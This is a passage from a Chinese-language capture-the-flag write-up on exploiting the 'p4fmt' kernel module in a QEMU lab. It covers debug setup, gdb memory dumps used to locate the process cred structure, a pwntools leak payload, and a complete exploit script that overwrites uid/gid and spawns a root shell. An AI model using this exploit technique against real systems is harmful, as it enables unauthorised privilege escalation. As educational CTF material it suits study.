    then
        echo "Usage: $me " >&2
        exit 2
    fi
    # Prepare temp files:
    tmp=$(mktemp /tmp/vmlinux-XXX)
    trap "rm -f $tmp" 0
    # That didn't work, so retry after decompression.
    try_decompress '\037\213\010' xy    gunzip
    try_decompress '\3757zXZ\000' abcde unxz
    try_decompress 'BZh'          xy    bunzip2
    try_decompress '\135\0\0\0'   xxx   unlzma
    try_decompress '\211\114\132' xy    'lzop -d'
    try_decompress '\002!L\030'   xxx   'lz4 -d'
    try_decompress '(\265/\375'   xxx   unzstd
    # Finally check for uncompressed images or objects:
    check_vmlinux $img
    # Bail out:
    echo "$me: Cannot find vmlinux." >&2
运行：
    kirin.sh  ./bzImage  > ./vmlinux
最后更改qemu启动脚本以便调试内核：
    #!/bin/bash
    qemu-system-x86_64 -s  -kernel ./bzImage \
            -initrd ./kirin.cpio.gz \
            -nographic \
            -append "console=ttyS0 nokaslr" \
    #-s:1234端口调试内核
    #nokaslr关闭内核地址随机，便于调试
运行gdb连接即可：
    / # whoami
    root
    / # cat /proc/modules 
    p4fmt 16384 0 - Live 0xffffffffc0000000 (O)
    qemu虚拟机下看到p4fmt模块的加载地址
    连接gdb并加载符号表：
    gdb ./vmlinux
    target remote 127.0.0.1:1234
    add-symbol-file ./p4fmt.ko 0xffffffffc0000000
**关于leak：**  
在load_p4_binary调用install_exec_creds时下断点
    b *0xffffffffc00000af
而后随意写一个满足上面格式的程序运行，gdb断在install_exec_creds以便查看cred相对bprm的偏移  
实际上可以直接查看汇编：
    x/10i 0xffffffffc00000af
    pwndbg> x/10i 0xffffffffc00000af
       0xffffffffc00000af : call   0xffffffff81189ec0
       0xffffffffc00000b4 : mov    rdi,0xffffffffc0002000
       0xffffffffc00000bb : call   0xffffffff8118a130
       0xffffffffc00000c0 : movabs rsi,0x7ffffffff000
       0xffffffffc00000ca : mov    rax,QWORD PTR gs:0x14d40
       0xffffffffc00000d3 : mov    rdx,QWORD PTR [rax]
       0xffffffffc00000d6 : test   edx,0x20000000
       0xffffffffc00000dc : je     0xffffffffc00000f3 
       0xffffffffc00000de : test   BYTE PTR [rax+0x83],0x8
       0xffffffffc00000e5 : mov    esi,0xc0000000
跟进0xffffffff81189ec0：
    pwndbg> x/10i 0xffffffff81189ec0
    => 0xffffffff81189ec0:  push   rbx
       0xffffffff81189ec1:  mov    rbx,rdi
       0xffffffff81189ec4:  call   0xffffffff81297aa0
       0xffffffff81189ec9:  mov    rdi,QWORD PTR [rbx+0xe0]
       0xffffffff81189ed0:  call   0xffffffff81073d30
       0xffffffff81189ed5:  mov    QWORD PTR [rbx+0xe0],0x0
       0xffffffff81189ee0:  mov    rdi,QWORD PTR gs:0x14d40
       0xffffffff81189ee9:  mov    rax,QWORD PTR [rdi+0x100]
       0xffffffff81189ef0:  mov    rax,QWORD PTR [rax+0x148]
       0xffffffff81189ef7:  and    eax,0x3
可以看到偏移位置为0xe0  
随意运行一个调试:
    pwndbg> x/30xg 0xffff8880077b2400
    0xffff8880077b2400: 0xffff888007530020  0xffff8880077d7280
    0xffff8880077b2410: 0x0000000000000000  0xffff888007530020
    0xffff8880077b2420: 0x0000000000000000  0x00007fffffdff030
    0xffff8880077b2430: 0x0000000000000000  0x0000000000000000
    0xffff8880077b2440: 0x0000000600000000  0x0000000101003450
    0xffff8880077b2450: 0x0000000000000090  0xffffffff89262008
    0xffff8880077b2460: 0x0000000000002000  0x0000000000000000
    0xffff8880077b2470: 0x6262626262626262  0x6161616161616161
    0xffff8880077b2480: 0x6161616161616161  0x6161616161616161
    0xffff8880077b2490: 0x6161616161616161  0x6161616161616161
    0xffff8880077b24a0: 0x6161616161616161  0x6161616161616161
    0xffff8880077b24b0: 0x6161616161616161  0x6161616161616161
    0xffff8880077b24c0: 0x6161616161616161  0x00007fffffffefae
    0xffff8880077b24d0: 0x0000000100000001  0x0000000000000000
    0xffff8880077b24e0: 0xffff88800756c3c0  0x0000000000000000
    pwndbg> x/20xg 0xffff88800756c3c0
    0xffff88800756c3c0: 0x0000000000000000  0xffff88800770f440
    0xffff88800756c3d0: 0x0000003fffffffff  0x0000000000000000
    0xffff88800756c3e0: 0x0000000000000000  0x0000000000000000
    0xffff88800756c3f0: 0xffffffff00000000  0x000000000000003f
    0xffff88800756c400: 0x0000003fffffffff  0x0000000000000000
    0xffff88800756c410: 0x0000000000000000  0x0000000000000000
    0xffff88800756c420: 0x0000000000000000  0xffffffff81c38280
    0xffff88800756c430: 0x0000000000000000  0x0000000000000000
    0xffff88800756c440: 0x0000000000000001  0x0000000000000000
    0xffff88800756c450: 0x0000000000000000  0x0000000000000000
**可以看到偏移0xe0位置为0xffff88800756c3c0  
而0xffff88800756c3c0下对应uid和gid位置都为0(debug时是root身份)  
同而注意到程序会打印vmmap和clear_user的参数  
因此可以将map_info_offset指向这里来vmmap(偏移位置为0xe0，即距离文件头偏移：0xe0-0x48=0x98位置，但是load_addr有位运算操作再传参并输出，因此这里选择设置map_info_offset为0x90,使length为cred_addr并leak)，此时即会打印出cred的地址，虽然最后会crash，不过能leak一次cred地址  
这里注意，开启内核地址随机化时cred地址线程间并不相同  
但是真实环境下可以观察到cred地址会是一组地址的循环,因此可以预估下次程序启动时cred地址从而覆盖掉uid和gid完成提权  
leak:**
    from pwn import  *
    payload = ""
    payload += "P4"             
    payload += p8(0)# version
    payload += p8(1)# type
    payload += p32(1)# map_count
    payload += p64(0x90)#map_info_offset
    payload += p64(0)     # entry
    payload += "kirin"
    print payload.encode("base64")
    #output=UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAa2lyaW4=
    echo -n "UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAa2lyaW4=" | base64 -d > /tmp/kirin
    chmod +x  /tmp/kirin
    /tmp/kirin
可以看到cred地址规律：
    /tmp $ ./kirin
    [  310.536033] vm_mmap(load_addr=0x0, length=0xffff90e845d72300, offset=0x0, prot=0)
    [  310.538726] kirin[559]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14
    [  310.543394] Code: Bad RIP value.
    Segmentation fault
    /tmp $ ./kirin
    [  311.480867] vm_mmap(load_addr=0x0, length=0xffff90e845d729c0, offset=0x0, prot=0)
    [  311.483814] kirin[560]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14
    [  311.486224] Code: Bad RIP value.
    Segmentation fault
    /tmp $ ./kirin
    [  312.793369] vm_mmap(load_addr=0x0, length=0xffff90e845d72cc0, offset=0x0, prot=0)
    [  312.797228] kirin[561]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14
    [  312.804765] Code: Bad RIP value.
    Segmentation fault
    /tmp $ ./kirin
    [  314.042323] vm_mmap(load_addr=0x0, length=0xffff90e845d72b40, offset=0x0, prot=0)
    [  314.045054] kirin[562]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14
    [  314.047779] Code: Bad RIP value.
    Segmentation fault
    /tmp $ ./kirin
    [  315.349773] vm_mmap(load_addr=0x0, length=0xffff90e845d72840, offset=0x0, prot=0)
    [  315.352563] kirin[563]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14
    [  315.357168] Code: Bad RIP value.
    Segmentation fault
    /tmp $ ./kirin
    [  316.229283] vm_mmap(load_addr=0x0, length=0xffff90e845d72300, offset=0x0, prot=0)
    [  316.232561] kirin[564]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14
    [  316.234984] Code: Bad RIP value.
    Segmentation fault
    /tmp $ ./kirin
    [  316.954076] vm_mmap(load_addr=0x0, length=0xffff90e845d729c0, offset=0x0, prot=0)
    [  316.957635] kirin[565]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14
    [  316.960276] Code: Bad RIP value.
    Segmentation fault
    /tmp $ ./kirin
    [  317.663571] vm_mmap(load_addr=0x0, length=0xffff90e845d72cc0, offset=0x0, prot=0)
    [  317.667293] kirin[566]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14
    [  317.669847] Code: Bad RIP value.
    Segmentation fault
    /tmp $ ./kirin
    [  318.516134] vm_mmap(load_addr=0x0, length=0xffff90e845d72b40, offset=0x0, prot=0)
    [  318.518924] kirin[567]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14
    [  318.522188] Code: Bad RIP value.
    Segmentation fault
    /tmp $ ./kirin
    [  319.341463] vm_mmap(load_addr=0x0, length=0xffff90e845d72840, offset=0x0, prot=0)
    [  319.343774] kirin[568]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14
    [  319.346129] Code: Bad RIP value.
    Segmentation fault
    /tmp $
可以看到每五个一个循环(至少在短时间内是这样)  
所以我们完全可以leak出一次循环后猜测下次cred位置，而后提权到root拿到flag  
**但是我在编写exp时遇到了问题  
最初想法是leak出五个地址，而后利用循环预测  
但是其实一段时间之后，这五个地址会变化，不过也会循环，这样虽然可以把所有可能情况列举生成exp，然后再预测，不过有点太麻烦  
所以最终选择leak处一个地址后直接循环此exp，减小中间的时间(我并不确定内核的这种地址循环是时间还是轮数问题)，很大地提高了命中率(约为100%)**
### EXP
    from pwn import *
    #context.log_level="debug"
    def get_payload(addr):
        payload="P4"
        payload+=p8(0)#version
        payload+=p8(1)#type
        payload+=p32(2)#map_info_num
        payload+=p64(0x18)#map_info_offset
        payload+=p64(0x400048)#entry
        payload+=p64(0x400000|7)#port=7->rwx
        payload+=p64(0x1000)#length
        payload+=p64(0)#offset
        payload+=p64((addr|8)+0x10)#cred
        payload+=p64(0x48)#overwrite_length
        payload+=p64(0)
        payload+=asm(shellcraft.amd64.sh(),arch="amd64")
        return payload.encode("base64").strip()
    p=process("./run.sh")
    p.sendlineafter("/ $ ",'echo -n "UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAa2lyaW4=" | base64 -d > /tmp/kirin; chmod +x /tmp/kirin')
    p.sendlineafter("/ $ ","/tmp/kirin")
    p.recvuntil("length=")
    addr=int(p.recvuntil(",")[:-1],16)
    print hex(addr)
    exp=get_payload(addr)
    cmd='echo -n "%s" | base64 -d > /tmp/exp; chmod +x /tmp/exp' %exp
    p.sendlineafter("/ $ ",cmd)
    p.recvuntil("$ ")
    for i in range(10):
        p.sendline("/tmp/exp")
        p.recvuntil("/ ",timeout=1)
        ans=p.recv(2)  
        print ans[0] 
        if ans[0]=='#':
            print "Get Shell Successfully"
            break
        if i==9:
            print "Failed this time,please try again!"
    p.interactive()